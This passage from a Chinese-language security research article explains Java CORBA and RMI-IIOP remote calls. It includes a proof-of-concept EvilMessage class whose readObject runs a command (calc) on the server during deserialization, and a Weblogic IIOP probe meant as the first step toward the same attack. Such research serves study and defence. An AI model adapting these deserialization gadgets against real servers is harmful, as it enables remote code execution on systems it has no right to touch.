        }
        private static InitialContext getInitialContext(String url) throws NamingException {
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
            env.put(Context.PROVIDER_URL, url);
            return new InitialContext(env);
        }
    }
客户端使用了两种方式，一种是COSNaming查询，另一种是Jndi查询，两种方式都可以，在jdk1.8.0_181测试通过。
首先启动一个命名服务器（可以理解为rmi的registry），使用ordb启动如下，orbd默认自带（如果你有jdk环境的话）：
然后启动服务端corba-iiop/src/main/java/com/longofo/example/Server.java，在启动corba-iiop/src/main/java/com/longofo/example/Client.java或JndiClient.java即可。
这里看下JndiClient的结果：
    > Listing namespace: 
    > Looking up name: ECHO-SERVER
    {
        "ECHO-SERVER":{
            "interfaces":[],
            "class":"com.sun.corba.se.impl.corba.CORBAObjectImpl"
        }
    }
    -----------call remote method--------------    Hello World!!!
注意到那个class不是没有获取到原本的EchoImpl类对应的Stub
class，而我们之前rmi测试也用过这个list查询，那时候是能查询到远程对象对应的stub类名的。这可能是因为Corba的实现机制的原因，com.sun.corba.se.impl.corba.CORBAObjectImpl是一个通用的Corba对象类，而上面的narrow调用EchoHelper.narrow就是一种将对象变窄的方式转换为Echo
Stub对象，然后才能调用echoString方法，并且每一个远程对象的调用都要使用它对应的xxxHelper。
下面是Corba客户端与服务端通信包：
第1、2个包是客户端与ordb通信的包，后面就是客户端与服务端通信的包。可以看到第二个数据包的IOR（Interoperable Object
Reference）中包含着服务端的ip、port等信息，意思就是客户端先从ordb获取服务端的信息，然后接着与服务端通信。同时这些数据中也没有平常所说的ac
ed 00 05 标志，但是其实反序列化的数据被包装了，在后面的RMI-IIOP中有一个例子会进行说明。
IOR几个关键字段：
  * Type ID：接口类型，也称为存储库ID格式。本质上，存储库ID是接口的唯一标识符。例如上面的IDL:omg.org/CosNaming/NamingContext:1.0
  * IIOP version：描述由ORB实现的IIOP版本
  * Host：标识ORB主机的TCP/IP地址
  * Port：指定ORB在其中侦听客户端请求的TCP/IP端口号
  * Object Key：唯一地标识了被ORB导出的servant
  * Components：包含适用于对象方法的附加信息的序列，例如支持的ORB服务和专有协议支持等
  * Codebase：用于获取stub类的远程位置。通过控制这个属性，攻击者将控制在服务器中解码IOR引用的类，在后面利用中我们能够看到。
只使用Corba进行远程调用很麻烦，要编写IDL文件，然后手动生成对应的类文件，同时还有一些其他限制，然后就有了RMI-IIOP，结合了Corba、RMI的优点。
### RMI-IIOP远程调用
编写一个RMI IIOP远程调用步骤：
  1. 定义远程接口类
  2. 编写实现类
  3. 编写服务端
  4. 编写客户端
  5. 编译代码并为服务端与客户端生成对应的使用类
下面直接给出一种恶意利用的demo场景。
服务端：
    package com.longofo.example;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import java.util.Hashtable;
    public class HelloServer {
        public final static String JNDI_FACTORY = "com.sun.jndi.cosnaming.CNCtxFactory";
        public static void main(String[] args) {
            try {
                //实例化Hello servant
                HelloImpl helloRef = new HelloImpl();
                //使用JNDI在命名服务中发布引用
                InitialContext initialContext = getInitialContext("iiop://127.0.0.1:1050");
                initialContext.rebind("HelloService", helloRef);
                System.out.println("Hello Server Ready...");
                Thread.currentThread().join();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        private static InitialContext getInitialContext(String url) throws NamingException {
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
            env.put(Context.PROVIDER_URL, url);
            return new InitialContext(env);
        }
    }
客户端：
    package com.longofo.example;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import javax.rmi.PortableRemoteObject;
    import java.util.Hashtable;
    public class HelloClient {
        public final static String JNDI_FACTORY = "com.sun.jndi.cosnaming.CNCtxFactory";
        public static void main(String[] args) {
            try {
                InitialContext initialContext = getInitialContext("iiop://127.0.0.1:1050");
                //从命名服务获取引用
                Object objRef = initialContext.lookup("HelloService");
                //narrow引用为具体的对象
                HelloInterface hello = (HelloInterface) PortableRemoteObject.narrow(objRef, HelloInterface.class);
                EvilMessage message = new EvilMessage();
                message.setMsg("Client call method sayHello...");
                hello.sayHello(message);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        private static InitialContext getInitialContext(String url) throws NamingException {
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
            env.put(Context.PROVIDER_URL, url);
            return new InitialContext(env);
        }
    }
假设在服务端中存在EvilMessage这个能进行恶意利用的类，在客户端中编写同样包名类名相同的类，并继承HelloInterface.sayHello(Message
msg)方法中Message类：
    package com.longofo.example;
    import java.io.ObjectInputStream;
    public class EvilMessage extends Message {
        private void readObject(ObjectInputStream s) {
            try {
                s.defaultReadObject();
                Runtime.getRuntime().exec("calc");
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
先编译好上面的代码，然后生成服务端与客户端进行远程调用的代理类：
    rmic -iiop com.longofo.example.HelloImpl
执行完成后，在下面生成了两个类（Tie用于服务端，Stub用于客户端）：
启动一个命名服务器：
    orbd -ORBInitialPort 1050 -ORBInitialHost loaclhost
启动服务端rmi-iiop/src/main/java/com/longofo/example/HelloServer.java，再启动客户端rmi-iiop/src/main/java/com/longofo/example/HelloClient.java即可看到计算器弹出，在JDK
1.8.1_181测试通过。
服务端调用栈如下：
注意那个_HelloImpl_Tie.read_value，这是在19年BlackHat议题[“An-Far-Sides-Of-Java-Remote-Protocols”](https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf)[1]提到的，如果直接看那个pdf中关于RMI-IIOP的内容，可能会一脸懵逼，因为议题中没有上面这些前置信息，有了上面这些信息，再去看那个议题的内容可能会轻松些。通过调用栈我们也能看到，IIOP通信中的某些数据被还原成了CDRInputStream，这是InputStream的子类，而被包装的数据在下面Stub
data这里：
最后通过反射调用到了EvilMessage的readObject，看到这里其实就清楚一些了。不过事实可能会有些残酷，不然为什么关于RMI-IIOP的漏洞很少看到，看看下面Weblogic RMI-IIOP来感受下。
### Weblogic中的RMI-IIOP
Weblogic默认是开启了iiop协议的，如果是上面这样的话，看通信数据以及上面的调用过程极大可能是不会经过Weblogic的黑名单了。
直接用代码测试吧（利用的Weblogic自带的JDK 1.6.0_29测试）：
    import com.alibaba.fastjson.JSON;
    import javax.ejb.RemoveException;
    import javax.management.j2ee.ManagementHome;
    import javax.naming.*;
    import javax.rmi.PortableRemoteObject;
    import java.io.IOException;
    import java.util.HashMap;
    import java.util.Hashtable;
    import java.util.Map;
    public class PayloadIiop {
        public final static String JNDI_FACTORY = "com.sun.jndi.cosnaming.CNCtxFactory";
        public static void main(String[] args) throws NamingException, IOException, ClassNotFoundException, RemoveException {
            InitialContext initialContext = getInitialContext("iiop://127.0.0.1:7001");
            System.out.println(JSON.toJSONString(listAllEntries(initialContext), true));
            Object objRef = initialContext.lookup("ejb/mgmt/MEJB");
            ManagementHome managementHome = (ManagementHome) PortableRemoteObject.narrow(objRef, ManagementHome.class);
            managementHome.remove(new Object());//这里只是测试能否成功调用到remove方法，如果能成功调用，Object按照上面RMI-IIOP那种方式恶意利用
        }
        private static Map listAllEntries(Context initialContext) throws NamingException {
            String namespace = initialContext instanceof InitialContext ? initialContext.getNameInNamespace() : "";
            HashMap map = new HashMap();
            System.out.println("> Listing namespace: " + namespace);
            NamingEnumeration list = initialContext.list(namespace);
            while (list.hasMoreElements()) {
                NameClassPair next = list.next();
                String name = next.getName();
                String jndiPath = namespace + name;
                HashMap lookup = new HashMap();
                try {
                    System.out.println("> Looking up name: " + jndiPath);
                    Object tmp = initialContext.lookup(jndiPath);
                    if (tmp instanceof Context) {
                        lookup.put("class", tmp.getClass());
                        lookup.put("interfaces", tmp.getClass().getInterfaces());
                        Map entries = listAllEntries((Context) tmp);
                        for (Map.Entry entry : entries.entrySet()) {
                            String key = entry.getKey();
                            if (key != null) {
                                lookup.put(key, entries.get(key));
                                break;
                            }
                        }